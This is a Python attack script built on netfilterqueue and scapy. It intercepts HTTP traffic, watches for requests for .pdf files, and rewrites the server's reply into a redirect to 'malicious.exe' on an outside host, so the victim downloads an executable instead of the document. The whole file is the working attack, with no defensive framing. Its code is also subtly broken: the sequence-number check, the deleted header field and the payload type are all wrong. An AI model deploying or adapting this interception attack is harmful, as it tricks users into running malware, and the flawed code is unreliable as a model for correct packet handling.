#!/usr/bin/ python
import netfilterqueue
import scapy.all as scapy


#callback_function
ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load 
    #as with the change in file -> change in size , thus change in length and checksum.
    #so we need to delete len, chksum fields from the IP and the TCP layers.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    return packet
def process_packet(packet):
    #converting to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        
        #dport == 80 means http request && sport == 80 means http response
        if scapy_packet[scapy.TCP].dport == 80:
            
            if str.encode(".pdf") in scapy_packet[scapy.Raw].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] pdf File Requested")
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            
            if scapy_packet[scapy.TCP].seq == ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File.")
                modified_load = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/malicious.exe")
                packet.set_payload(bytes(modified_load))
                # print(scapy_packet.show())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()